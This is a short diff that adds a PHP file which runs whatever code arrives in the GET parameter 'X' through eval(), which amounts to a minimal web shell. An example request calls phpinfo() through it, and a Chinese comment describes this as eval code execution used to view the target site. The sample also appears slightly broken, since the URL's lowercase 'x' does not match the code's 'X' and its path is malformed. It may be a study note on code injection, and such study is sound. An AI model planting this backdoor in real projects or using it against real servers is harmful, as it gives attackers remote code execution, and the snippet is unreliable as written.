@@ -1,0 +1,7 @@
+<?php
+  $code=$_GET['X'];
+  eval($code);
+?> 
+http://localhost//.php/?x=phpinfo();
+
+eval代码执行；phpinfo()去看目标网站内容；
